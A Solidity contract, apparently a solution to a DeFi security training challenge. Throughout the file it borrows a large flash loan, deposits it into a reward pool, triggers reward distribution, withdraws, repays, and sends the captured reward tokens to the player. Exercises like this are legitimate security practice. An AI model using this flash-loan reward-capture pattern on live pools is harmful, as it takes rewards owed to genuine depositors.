// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract testFlashloanRewarder {
    address public flashLoan;
    address public TheRewarderPool;
    address player;
    address rewardToken;
    address liquidityToken;
    address accountingToken;

    constructor(
        address _flashLoan,
        address _TheRewarderPool,
        address _player,
        address _rewardToken,
        address _liquidityToken,
        address _accountingToken
    ) {
        TheRewarderPool = _TheRewarderPool;
        player = _player;
        flashLoan = _flashLoan;
        rewardToken = _rewardToken;
        liquidityToken = _liquidityToken;
        accountingToken = _accountingToken;
    }

    function start() external {
        (bool suc, ) = flashLoan.call(
            abi.encodeWithSignature("flashLoan(uint256)", 1000000e18)
        );
        // require(suc, "start");
    }

    function end() external {
        // (bool suc, ) = flashLoan.call(
        //     abi.encodeWithSignature("flashLoan(uint256)", 1000000e18)
        // );

        // require(suc, "flashLoan");
        (bool suc, ) = TheRewarderPool.call(
            abi.encodeWithSignature("distributeRewards()")
        );

        require(suc, "distributeRewards");

        // bytes memory bal;
        // (suc, bal) = rewardToken.call(
        //     abi.encodeWithSignature("balanceOf(address)", address(this))
        // );
        // require(suc, "balanceOf");
        uint256 bal = printTokenBalance(
            rewardToken,
            address(this),
            "rewardToken end"
        );

        (suc, ) = rewardToken.call(
            abi.encodeWithSignature("transfer(address,uint256)", player, bal)
        );
        require(suc, "transfer");
    }

    function receiveFlashLoan(uint256) external {
        printTokenBalance(
            liquidityToken,
            address(this),
            "receiveFlashLoan liquidityToken balance before"
        );
        {
            liquidityToken.call(
                abi.encodeWithSignature(
                    "approve(address,uint256)",
                    TheRewarderPool,
                    1000000e18
                )
            );
        }
        {
            (bool suc, ) = TheRewarderPool.call(
                abi.encodeWithSignature("deposit(uint256)", 1000000e18)
            );

            require(suc, "deposit");
        }

        printTokenBalance(
            accountingToken,
            address(this),
            "accountingToken balance after deposit"
        );
        {
            (bool suc, ) = TheRewarderPool.call(
                abi.encodeWithSignature("withdraw(uint256)", 1000000e18)
            );

            require(suc, "withdraw");
        }
        printTokenBalance(
            liquidityToken,
            address(this),
            "receiveFlashLoan liquidityToken balance after"
        );

        {
            (bool suc, ) = liquidityToken.call(
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    flashLoan,
                    1000000e18
                )
            );
            require(suc, "liquidityToken transfer");
        }
    }

    function printTokenBalance(
        address token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    receive() external payable {}
}
